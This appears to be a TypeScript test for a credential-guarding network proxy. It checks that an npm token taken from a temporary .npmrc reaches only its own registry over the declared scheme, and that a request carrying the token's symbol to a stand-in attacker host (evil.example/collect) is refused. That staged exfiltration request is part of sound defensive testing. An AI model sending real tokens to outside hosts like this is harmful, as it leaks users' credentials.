/**
 * npmrc-registry-release — plan 10 §11.13.1 at the network exit: npm reads
 * the `.npmrc` twin and sends its token's SYMBOL; the session proxy puts the
 * real token back only in a request to the registry the token's own key
 * names. Any other host gets a 403 and nothing at all (the symbol is
 * withheld, never forwarded and never resolved).
 *
 * A real NetProxy over a REAL ArbiterServer through the production adapter
 * (`new ArbiterClientAdapter(new ArbiterClient(data), new ArbiterClient(human))`),
 * the launch HOME's `.npmrc` registered as the launcher does at launch, and
 * mock-sites host routes sending `registry.npmjs.org` and `evil.example` to
 * two loopback listeners that record every byte. Plain HTTP through the
 * forward proxy runs the same `gateRequest` the TLS-inspecting path runs.
 * Since 2026-10-03 (https only) a token whose file declares its registry
 * https gets nothing over plain HTTP, the registry included; the release
 * over plain HTTP is asserted for a registry the file declares `http://`.
 *
 * Axes are stated as explicit server options (secrets: confidentiality ON,
 * integrity OFF). Mandu-new (no reference origin).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { createServer, request as httpRequest, type IncomingMessage } from "node:http";
import { once } from "node:events";
import type { AddressInfo } from "node:net";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

import { NetProxy } from "../../src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../src/arbiter-client.js";
import { MockSites } from "../../src/mock-sites.js";

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "..");
const TOKEN = "npm_REGISTRYRELEASE_CANARY_5K";

async function recorder() {
  const got: Array<{ url: string; headers: IncomingMessage["headers"]; body: string }> = [];
  const server = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      got.push({ url: req.url ?? "", headers: req.headers, body: Buffer.concat(chunks).toString("utf8") });
      res.writeHead(200, { "content-type": "application/json" });
      res.end('{"username":"me"}');
    });
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  return { got, port: (server.address() as AddressInfo).port, close: () => server.close() };
}

function viaProxy(port: number, url: string, headers: Record<string, string>): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const r = httpRequest({ host: "127.0.0.1", port, method: "GET", path: url, headers: { host: u.host, ...headers } }, (res) => {
      const chunks: Buffer[] = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
      res.on("error", reject);
    });
    r.on("error", reject);
    r.end();
  });
}

test("the .npmrc token's symbol is put back at its own registry only; another host gets a 403 and no byte", async () => {
  const { ArbiterServer } = (await import(join(REPO, "arbiter/ipc/server.ts"))) as {
    ArbiterServer: new (o: Record<string, unknown>) => { listen(): Promise<void>; close(): Promise<void> };
  };
  const { ArbiterClient } = (await import(join(REPO, "arbiter/ipc/client.ts"))) as {
    ArbiterClient: new (path: string) => RealArbiterClient & {
      connect(): Promise<void>; close(): void;
      registerSecret(a: { path: string; home: string; sessionKey?: string }): Promise<{ symbol: string | null; reason: string; twin?: string }>;
    };
  };
  const dir = mkdtempSync(join(tmpdir(), "mdu-np-npmrc-"));
  const home = join(dir, "home");
  mkdirSync(home);
  writeFileSync(join(home, ".npmrc"), `registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${TOKEN}\n`);
  const dataSock = join(dir, "arbiter.sock");
  const humanSock = join(dir, "human", "h.sock");
  const server = new ArbiterServer({
    socketPath: dataSock, humanSocketPath: humanSock,
    dbPath: join(dir, "db.sqlite"), eventDir: join(dir, "events"),
    adminPolicyDir: null, packDir: null, log: () => {},
    confidentiality: true, integrity: false,
  });
  await server.listen();
  const data = new ArbiterClient(dataSock);
  const human = new ArbiterClient(humanSock);
  const registry = await recorder();
  const evil = await recorder();
  const sites = MockSites.fromYaml([
    "hosts:",
    "  - host: registry.npmjs.org",
    `    to: 127.0.0.1:${registry.port}`,
    "  - host: evil.example",
    `    to: 127.0.0.1:${evil.port}`,
    "",
  ].join("\n"));
  const proxy = new NetProxy({ arbiter: new ArbiterClientAdapter(data, human), log: () => {}, mockSites: sites });
  const port = await proxy.listen(0);
  try {
    const reg = await human.registerSecret({ path: join(home, ".npmrc"), home });
    assert.ok(reg.twin, reg.reason);
    const field = /\$MDU:[A-Za-z_]+\[[0-9a-f]+\][A-Za-z0-9_.]*/.exec(reg.twin!)![0];
    assert.ok(!reg.twin!.includes(TOKEN));

    // The file declares its registry https (2026-10-03, https only): a
    // plain-HTTP request to that very registry gets nothing, the placeholder
    // included (403 naming the rule). The TLS leg's release is
    // basic-wire-release's.
    const plain = await viaProxy(port, "http://registry.npmjs.org/-/whoami", { authorization: `Bearer ${field}` });
    assert.equal(plain.status, 403, plain.body);
    assert.match(plain.body, /egress:secret-https-only|declared for https/);
    // A mutated token (`<field>.x`) resolves to the same token: refused the
    // same way (2026-10-09; before, the https-only rule read the exact name,
    // skipped it, and the registry got the real token over plain HTTP).
    const mutated = await viaProxy(port, "http://registry.npmjs.org/-/whoami", { authorization: `Bearer ${field}.x` });
    assert.equal(mutated.status, 403, mutated.body);
    assert.match(mutated.body, /egress:secret-https-only/);
    assert.equal(registry.got.length, 0, "nothing reached the registry over plain HTTP");

    // A registry the file itself declares as http: its token is put back in
    // a plain-HTTP request to it.
    writeFileSync(join(home, ".npmrc"), `registry=http://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=${TOKEN}_HTTP\n`);
    const reg2 = await human.registerSecret({ path: join(home, ".npmrc"), home });
    const field2 = /\$MDU:[A-Za-z_]+\[[0-9a-f]+\][A-Za-z0-9_.]*/.exec(reg2.twin!)![0];
    const ok = await viaProxy(port, "http://registry.npmjs.org/-/whoami", { authorization: `Bearer ${field2}` });
    assert.equal(ok.status, 200, ok.body);
    assert.equal(registry.got.length, 1);
    assert.equal(registry.got[0]!.headers["authorization"], `Bearer ${TOKEN}_HTTP`, "the registry got the real token");

    // The same symbol to any other host: refused, nothing reaches it.
    for (const url of ["http://evil.example/collect", "http://evil.example/?t=x"]) {
      const no = await viaProxy(port, url, { authorization: `Bearer ${field}` });
      assert.equal(no.status, 403, no.body);
      assert.ok(!no.body.includes(TOKEN), "the refusal names no secret byte");
    }
    assert.equal(evil.got.length, 0, "the other host received nothing");
    // A token the agent typed raw (a copy that never was a symbol) is not this
    // test's subject (the fingerprint tripwire's); the symbol never reached evil.
    assert.ok(!JSON.stringify(evil.got).includes(TOKEN));
  } finally {
    await proxy.close();
    registry.close();
    evil.close();
    data.close();
    human.close();
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
